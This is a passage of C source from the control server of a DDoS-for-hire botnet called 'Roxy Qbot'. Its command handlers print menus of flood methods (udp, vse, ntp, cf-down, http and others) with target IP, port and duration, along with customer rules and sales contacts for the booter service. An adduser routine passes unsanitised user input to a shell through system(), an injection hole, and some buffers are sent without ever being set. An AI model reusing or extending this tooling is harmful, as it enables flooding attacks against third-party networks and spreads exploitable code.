        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}		
			if(strstr(buf, "Rules") || strstr(buf, "RULES") || strstr(buf, "rules")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Cayosin1  [800];
				char Cayosin2  [800];
				char Cayosin3  [800];
				char Cayosin4  [800];
				char Cayosin5  [800];
				char Cayosin6  [800];
				char Cayosin7  [800];
                char Cayosin8  [800];
				char Cayosin9  [800];
				char Cayosin10  [800];
                char Cayosin11  [800];
                char Cayosin12  [800];
                char Cayosin13  [800];
                char Cayosin14  [800];
                char Cayosin15  [800];
                char Cayosin16  [800];
                char Cayosin17  [800];

                sprintf(Cayosin1, "\x1b[1;33m             ╔════════════════════════════════════════════════════════════════════════════╗\r\n");
                sprintf(Cayosin2, "\x1b[1;33m             ║ #1 NO SHARING NET IP IF DONE WILL LEAD INTO PERM BAN!!!!                   ║\r\n");
                sprintf(Cayosin3, "\x1b[1;33m             ║ #2 NO SHARING YOUR NET LOGIN IF DONE WILL LEAD INTO PERM BAN!!!!           ║\r\n");
                sprintf(Cayosin4, "\x1b[1;33m             ║ #3 NO DONT SPAM ATTACKS IF DONE WILL LEAD INTO PERM BAN!!!!                ║\r\n");
                sprintf(Cayosin5, "\x1b[1;33m             ║ #3 ALL DSTATS ARE BLOACKED HIT THEM WILL LEAD INTO PERM BAN!!!!            ║\r\n");
                sprintf(Cayosin6, "\x1b[1;33m             ║ #4 NO REFUNDS!!!!                                                          ║\r\n");
                sprintf(Cayosin7, "\x1b[1;33m             ║ #5 NO HITTING SAME IP MORE THEN ONCE IF NEEDED MORE DM OWNER/ADMIN         ║\r\n");
                sprintf(Cayosin8, "\x1b[1;33m             ║ #6 NO ASKING ADMINS/RESELLERS FOR FREE SHIT!!!!                            ║\r\n");
                sprintf(Cayosin9, "\x1b[1;33m             ║ #8 YOUR COOLDOWN DOSE NOT STOP SPAMMING!!!!                                ║\r\n");
               sprintf(Cayosin10, "\x1b[1;33m             ║ #8 NO HITTING HOMES WITH PRIVATE/BYPASS METHODS!!!!                        ║\r\n");
               sprintf(Cayosin11, "\x1b[1;33m             ║ #8 NO HOLDING HOMES LONGER THEN 300 IF I SEE DONE I WILL CONTACT YOU       ║\r\n");
               sprintf(Cayosin12, "\x1b[1;33m             ║ #8 DONT HIT PRIVATE WEBSITES/GOV SHIT SUCH AS GOOGLE!!!!                   ║\r\n");
               sprintf(Cayosin13, "\x1b[1;33m             ║ #8 DO NOT COVER CNC IN LOTS OF SHIT AND TRY CRASH IT!!!!                   ║\r\n");
               sprintf(Cayosin14, "\x1b[1;33m             ║════════════════════════════════════════════════════════════════════════════║\r\n");
               sprintf(Cayosin15, "\x1b[1;33m             ║\x1b[1;35m   Any Questions? DM @Fuaming, @ylww__ On Instagram                         \x1b[1;33m║\r\n");
               sprintf(Cayosin16, "\x1b[1;33m             ║\x1b[1;35m   Dont Follow Any Of These Leads To Perm Ban NO REFUNDS!!!!                \x1b[1;33m║\r\n");
               sprintf(Cayosin17, "\x1b[1;33m             ╚════════════════════════════════════════════════════════════════════════════╝\r\n");
				
				if(send(datafd, Cayosin1, strlen(Cayosin1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin2, strlen(Cayosin2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin3, strlen(Cayosin3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin4, strlen(Cayosin4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin5, strlen(Cayosin5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin6, strlen(Cayosin6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin7, strlen(Cayosin7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosin8, strlen(Cayosin8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin9, strlen(Cayosin9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin10, strlen(Cayosin10), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin11, strlen(Cayosin11), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin12, strlen(Cayosin12), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin13, strlen(Cayosin13), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin14, strlen(Cayosin14), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin15, strlen(Cayosin15), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin16, strlen(Cayosin16), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosin17, strlen(Cayosin17), MSG_NOSIGNAL) == -1) goto end;

				while(1) {			
			char input [5000];
        sprintf(input, "\x1b[1;33m~ \x1b[1;36m", login_infos[find_line].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		
				break;
				}
				continue;
			}	
			if(strstr(buf, "banners") || strstr(buf, "Banners") || strstr(buf, "BANNERS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Cayosiz1  [800];
				char Cayosiz2  [800];
				char Cayosiz3  [800];
				char Cayosiz4  [800];
				char Cayosiz5  [800];
				char Cayosiz6  [800];
				char Cayosiz7  [800];
                char Cayosiz8  [800];
				char Cayosiz9  [800];
				char Cayosiz10  [800];

                sprintf(Cayosiz1, "\x1b[1;33m╔═════════════════════╗\r\n");
                sprintf(Cayosiz2, "\x1b[1;33m║\x1b[1;37m  Roxy Qbot Banners  \x1b[1;33m║\r\n");
                sprintf(Cayosiz3, "\x1b[1;33m║═════════════════════║\r\n");
                sprintf(Cayosiz4, "\x1b[1;33m║\x1b[1;35m        jok\x1b[1;32mer        \x1b[1;33m║\r\n");
                sprintf(Cayosiz5, "\x1b[1;33m║\x1b[1;31m      parax\x1b[1;0minal      \x1b[1;33m║\r\n");
                sprintf(Cayosiz6, "\x1b[1;33m║\x1b[1;34m      antisocial     \x1b[1;33m║\r\n");
                sprintf(Cayosiz7, "\x1b[1;33m║\x1b[1;32m        goofy        \x1b[1;33m║\r\n");
               sprintf(Cayosiz10, "\x1b[1;33m╚═════════════════════╝\r\n");
				
				if(send(datafd, Cayosiz1, strlen(Cayosiz1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz2, strlen(Cayosiz2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz3, strlen(Cayosiz3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz4, strlen(Cayosiz4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz5, strlen(Cayosiz5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz6, strlen(Cayosiz6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz7, strlen(Cayosiz7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Cayosiz8, strlen(Cayosiz8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosiz9, strlen(Cayosiz9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Cayosiz10, strlen(Cayosiz10), MSG_NOSIGNAL) == -1) goto end;

				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}			
			
            
            if(strstr(buf, "adduser")) // idk urm , bro send me this playlist, i like it, its chill, or whatver your listening on
            {
            	{

            	char sendbuf[1024];
            	memset(buf, 0, 2048);
            	char uinfo[100];
            	char myuser[1024];
            	char mypass[1024];
            	char mytoken[1024];
            	char myexpiry[1024];
            	char mymax[1024];
            	char mycool[1024];
                memset(buf, 0, 2048);// try now 
            	sprintf(sendbuf, "\e[37mUsername: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(myuser, buf);
            	memset(buf, 0, 2048);
            	sprintf(sendbuf, "\e[37mPassword: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(mypass, buf);
            	memset(buf, 0, 2048);
            	sprintf(sendbuf, "\e[37mToken: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(mytoken, buf);
            	memset(buf, 0, 2048);
            	sprintf(sendbuf, "\e[37mExpiry: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(myexpiry, buf); 
            	memset(buf, 0, 2048);
            	sprintf(sendbuf, "\e[37mCooldown: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(mymax, buf);
            	memset(buf, 0, 2048);
            	sprintf(sendbuf, "\e[37mMax Time: ");
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            	fdgets(buf, sizeof(buf), datafd);
            	trim(buf);
            	strcpy(mycool, buf);
            	sprintf(uinfo, "echo '%s %s %s %s %s %s' >> /root/cnc/login.txt", myuser, mypass, mytoken, myexpiry, mymax, mycool);// ok its done , send me these beats, or playlist. what can u hear it ahahahah, yes but i like it, compile the cnc rq, make sure no erros
            	system(uinfo);
            	sprintf(sendbuf, "Added User: %s\r\n", myuser);
            	send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                memset(uinfo, 0, sizeof(uinfo));                
                memset(myuser, 0, sizeof(myuser));
				memset(mypass, 0, sizeof(mypass));
                memset(myexpiry, 0, sizeof(myexpiry));
                memset(mymax, 0, sizeof(mymax));
                memset(mycool, 0, sizeof(mycool));
                    }
                         }
			if(strstr(buf, "WEBSITE") || strstr(buf, "Website") || strstr(buf, "website")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char OG1  [800];
				char OG2  [800];
				char OG3  [800];
				char OG4  [800];
				char OG5  [800];
				char OG6  [800];
				char OG7  [800];
				
				sprintf(OG1,  "\x1b[1;33m ╔═══════════════\x1b[1;34m════════════════╗\r\n");
                sprintf(OG2,  "\x1b[1;33m ║      Website/L\x1b[1;34m7 Methods       ║\r\n");
                sprintf(OG3,  "\x1b[1;33m ║═══════════════\x1b[1;34m════════════════║\r\n"); 
                sprintf(OG4,  "\x1b[1;33m ║. https ip port\x1b[1;34m time 1024      ║\r\n");
                sprintf(OG5,  "\x1b[1;33m ║. hammed ip por\x1b[1;34mt time 1460     ║\r\n");
                sprintf(OG6,  "\x1b[1;33m ║. acid url ip p\x1b[1;34mort time        ║\r\n");
                sprintf(OG7,  "\x1b[1;33m ╚═══════════════\x1b[1;34m════════════════╝\r\n");
				
				if(send(datafd, OG1, strlen(OG1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG2, strlen(OG2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG3, strlen(OG3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG4, strlen(OG4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG5, strlen(OG5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG6, strlen(OG6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, OG7, strlen(OG7), MSG_NOSIGNAL) == -1) goto end;
				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}		
			if(strstr(buf, "News") || strstr(buf, "news") || strstr(buf, "NEWS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Sora1  [800];
				char Sora2  [800];
				char Sora3  [800];
				char Sora4  [800];
				char Sora5  [800];
				char Sora6  [800];
                char Sora7  [800];
                char Sora8  [800];
                char Sora9  [800];
                char Sora10  [800];
                char Sora11  [800];
                char Sora12  [800];
                char Sora13  [800];
								
				sprintf(Sora1, "\x1b[1;90m ╔═══════════════════════════════════════╗ \r\n");
                sprintf(Sora2, "\x1b[1;90m ║                News Box               ║\r\n");
                sprintf(Sora3, "\x1b[1;90m ║═══════════════════════════════════════║\r\n");
                sprintf(Sora4, "\x1b[1;90m ║ Now Added IP Logs If i See More Then  ║\r\n");
                sprintf(Sora5, "\x1b[1;90m ║ 1 Diff IP login The User Will Be Ban  ║\r\n");
                sprintf(Sora6, "\x1b[1;90m ║ CF-Down Method Working Corectly Enjoy ║\r\n");
                sprintf(Sora7, "\x1b[1;90m ║ Dont hit with private methods on homes║\r\n");
                sprintf(Sora8, "\x1b[1;90m ║ not gunna tell you more then once i   ║\r\n");
                sprintf(Sora9, "\x1b[1;90m ║ see that shit again user is getting   ║\r\n");
               sprintf(Sora10, "\x1b[1;90m ║ ban no matter what sorry to all just  ║\r\n");
               sprintf(Sora11, "\x1b[1;90m ║ annoying the way i have to buy new    ║\r\n");
               sprintf(Sora12, "\x1b[1;90m ║ servers 24/7 <3                       ║\r\n");
               sprintf(Sora13, "\x1b[1;90m ╚═══════════════════════════════════════╝\r\n");
				
				if(send(datafd, Sora1, strlen(Sora1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sora2, strlen(Sora2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sora3, strlen(Sora3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sora4, strlen(Sora4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sora5, strlen(Sora5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sora6, strlen(Sora6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora7, strlen(Sora7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora8, strlen(Sora8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora9, strlen(Sora9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora10, strlen(Sora10), MSG_NOSIGNAL) == -1) goto end; 
                if(send(datafd, Sora11, strlen(Sora11), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora12, strlen(Sora12), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sora13, strlen(Sora13), MSG_NOSIGNAL) == -1) goto end;

				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "Api") || strstr(buf, "API") || strstr(buf, "api")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char Sore1  [800];
				char Sore2  [800];
				char Sore3  [800];
				char Sore4  [800];
				char Sore5  [800];
				char Sore6  [800];
                char Sore7  [800];
                char Sore8  [800];
                char Sore9  [800];
                char Sore10  [800];
                char Sore11  [800];
								
				sprintf(Sore1,  "\x1b[1;31m ╔═══════════════════════════════╗\r\n");
                sprintf(Sore3,  "\x1b[1;31m ║       No More 300 Secs        ║\r\n");
                sprintf(Sore4,  "\x1b[1;31m ║═══════════════════════════════║\r\n"); 
                sprintf(Sore5,  "\x1b[1;31m ║      Dont Use On Homes        ║\r\n");
                sprintf(Sore6,  "\x1b[1;31m ║                               ║\r\n");
                sprintf(Sore7,  "\x1b[1;31m ║  You Do Not Have API Access   ║\r\n");
                sprintf(Sore8,  "\x1b[1;31m ║  Dm Owner To Purchase         ║\r\n");
                sprintf(Sore9,  "\x1b[1;31m ║  @fuaming <3                  ║\r\n");
                sprintf(Sore11, "\x1b[1;31m ╚═══════════════════════════════╝\r\n");
				
				if(send(datafd, Sore1, strlen(Sore1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sore2, strlen(Sore2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sore3, strlen(Sore3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sore4, strlen(Sore4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sore5, strlen(Sore5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Sore6, strlen(Sore6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sore7, strlen(Sore7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sore8, strlen(Sore8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sore9, strlen(Sore9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sore10, strlen(Sore10), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, Sore11, strlen(Sore11), MSG_NOSIGNAL) == -1) goto end;

				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "AMP") || strstr(buf, "amp") || strstr(buf, "Amp")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [800];
				char ls2  [800];
				char ls3  [800];
				char ls4  [800];
				char ls5  [800];
				char ls6  [800];
				char ls7  [800];
				char ls8  [800];






sprintf(ls1,  "\e[1;33m   _=_______________________________________\r\n");
sprintf(ls2,  "\e[1;33m  /  ////. cf-down [IP] [PORT] [60]         |\r\n");
sprintf(ls3,  "\e[1;33m _|_////____________________________________|\r\n");
sprintf(ls4,  "\e[1;33m    )/  o  /) /  )/ \r\n");
sprintf(ls5,  "\e[1;35m   (/     /)__\_)) \r\n");
sprintf(ls6,  "\e[1;35m  (/     /) \r\n");
sprintf(ls7,  "\e[1;35m (/     /) \r\n");
sprintf(ls8,  "\e[1;35m(/_ o _/) \r\n");

                if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "envoyjiiuv1")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char envoy1  [800];
				char envoy2  [800];
				char envoy3  [800];
				char envoy4  [800];
				char envoy5  [800];
				char envoy6  [800];
                char envoy7  [800];
                char envoy8  [800];
                char envoy9  [800];
                char envoy10  [800];
                char envoy11  [800];
                char envoy12  [800];
                char envoy13  [800];
                char envoy14  [800];
                char envoy15  [800];
                char envoy16  [800];
								
				sprintf(envoy1, "\x1b[1;90m\x1b[1;91m ┌─┐┌┐┌┬  ┬┌─┐┬ ┬\r\n");
                sprintf(envoy2, "\x1b[1;90m\x1b[1;91m ├┤ │││└┐┌┘│ │└┬┘\r\n");
                sprintf(envoy3, "\x1b[1;90m\x1b[1;91m └─┘┘└┘ └┘ └─┘ ┴\r\n");
                sprintf(envoy4, "\x1b[1;90m\x1b[1;95m\r\n");
                sprintf(envoy5, "\x1b[1;90m\x1b[1;95m\r\n");
                sprintf(envoy6, "\x1b[1;90m\x1b[1;95m\r\n");
                sprintf(envoy7, "\x1b[1;90m\x1b[1;95m\r\n");
                sprintf(envoy8, "\x1b[1;90m\x1b[1;95m\r\n");
                sprintf(envoy9, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy10, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy11, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy12, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy13, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy14, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy15, "\x1b[1;90m\x1b[1;95m\r\n");
               sprintf(envoy16, "\x1b[1;90m\x1b[1;95m\r\n");
				
				if(send(datafd, envoy1, strlen(envoy1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoy2, strlen(envoy2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoy3, strlen(envoy3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoy4, strlen(envoy4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoy5, strlen(envoy5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, envoy6, strlen(envoy6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy7, strlen(envoy7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy8, strlen(envoy8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy9, strlen(envoy9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy10, strlen(envoy10), MSG_NOSIGNAL) == -1) goto end; 
                if(send(datafd, envoy11, strlen(envoy11), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy12, strlen(envoy12), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy13, strlen(envoy13), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy14, strlen(envoy14), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy15, strlen(envoy15), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, envoy16, strlen(envoy16), MSG_NOSIGNAL) == -1) goto end;


				while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;90m╔═\x1b[1;90m[\x1b[1;90m%s\x1b[1;95m🤡\x1b[1;95mRoxy🤡\x1b[1;90m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;90m╚═══════>\x1b[1;96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "joker") || strstr(buf, "Joker") || strstr(buf, "JOKER")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char banneru1  [800];
                char banneru2  [800];
                char banneru3  [800];
                char banneru4  [800];
                char banneru5  [800];
                char banneru6  [800];
                char banneru7  [800];
                char banneru8  [800];
                char banneru9  [800];
                char banneru10  [800];
                char banneru11  [800];
                char banneru12  [800];
                char banneru13  [800];
                char banneru14  [800];
                char banneru15  [800];
                char banneru16  [800];
                char banneru17  [800];

				sprintf(banneru1, "\x1b[95m                          ╦╔═╗╦╔═╔═╗╦═╗\r\n");
                sprintf(banneru2, "\x1b[95m                          ║║ ║╠╩╗║╣ ╠╦╝\r\n");
                sprintf(banneru3, "\x1b[95m                         ╚╝╚═╝╩ ╩╚═╝╩╚═\r\n");
                sprintf(banneru4, "\x1b[37m                        We are all clowns\r\n");
                sprintf(banneru5, "\x1b[95m     ╔══════════════════════════════╦══════════════════════════════╗\r\n");
                sprintf(banneru6, "\x1b[95m     ║ovh [IP] [TIME] [PORT]        ║ game [IP] [TIME] dport=[PORT]║\r\n");
                sprintf(banneru7, "\x1b[95m     ║stdhex[IP] [TIME] [PORT]      ║ lag  [IP] [TIME] dport=[PORT]║\r\n");
                sprintf(banneru8, "\x1b[95m     ║udp [IP] [TIME] [PORT] 32 0 10║ path [IP] [TIME] dport=[PORT]║\r\n");
                sprintf(banneru9, "\x1b[95m     ║vse [IP] [TIME] [PORT] 32 0 10║ vpn  [IP] [TIME] dport=[PORT]║\r\n");
               sprintf(banneru10, "\x1b[95m     ╚════════════╦═════════════════╩══════════════╦═══════════════╝\r\n");
               sprintf(banneru11, "\x1b[92m                  ║     [+] Soofed Methods [+]     ║\r\n");
               sprintf(banneru12, "\x1b[92m                  ║ icmp [IP] [TIME]  [PORT] 1460  ║\r\n");
               sprintf(banneru13, "\x1b[92m                  ║ ntp   [IP] [TIME] [PORT]       ║\r\n");
               sprintf(banneru14, "\x1b[92m                  ║ flare [IP] [TIME] [PORT]       ║\r\n");
               sprintf(banneru15, "\x1b[92m                  ║ thump[IP] [TIME] dport=[PORT]  ║\r\n");
               sprintf(banneru16, "\x1b[92m                  ║ http [IP] [TIME] dport=[PORT]  ║\r\n");
			   sprintf(banneru17, "\x1b[92m                  ╚════════════════════════════════╝\r\n");

				if(send(datafd, banneru1, strlen(banneru1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banneru2, strlen(banneru2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banneru3, strlen(banneru3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banneru4, strlen(banneru4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banneru5, strlen(banneru5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banneru6, strlen(banneru6), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru7, strlen(banneru7), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru8, strlen(banneru8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru9, strlen(banneru9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru10, strlen(banneru10), MSG_NOSIGNAL) == -1) goto end; 
                if(send(datafd, banneru11, strlen(banneru11), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru12, strlen(banneru12), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru13, strlen(banneru13), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru14, strlen(banneru14), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru15, strlen(banneru15), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru16, strlen(banneru16), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, banneru17, strlen(banneru17), MSG_NOSIGNAL) == -1) goto end;
                while(1) {			
			char input [5000];
		    char input1 [5000];
        sprintf(input, "\x1b[1;93m╔═\x1b[1;93m[\x1b[1;93m%s\x1b[1;93m㊮\x1b[1;93mRoxy㊮\x1b[1;93m] \x1b[0m\r\n", login_infos[find_line].id);
		sprintf(input1,"\x1b[1;93m╚═══════>\x1b[1;91");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input1, strlen(input1), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			    if(strstr(buf, "envoihhiyv2")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char envoyw1  [800];
				char envoyw2  [800];
				char envoyw3  [800];
				char envoyw4  [800];
				char envoyw5  [800];
				char envoyw6  [800];
                char envoyw7  [800];
							
				sprintf(envoyw1, "\x1b[1;90m\x1b[1;95▄███▄      ▄       ▄   ████▄ ▀▄    ▄ \r\n");
                sprintf(envoyw2, "\x1b[1;90m\x1b[1;95█▀   ▀      █       █  █   █   █  █  \r\n");
                sprintf(envoyw3, "\x1b[1;90m\x1b[1;95██▄▄    ██   █ █     █ █   █    ▀█   \r\n");
                sprintf(envoyw4, "\x1b[1;90m\x1b[1;95█▄   ▄▀ █ █  █  █    █ ▀████    █    \r\n");
                sprintf(envoyw5, "\x1b[1;90m\x1b[1;95▀███▀   █  █ █   █  █         ▄▀     \r\n");
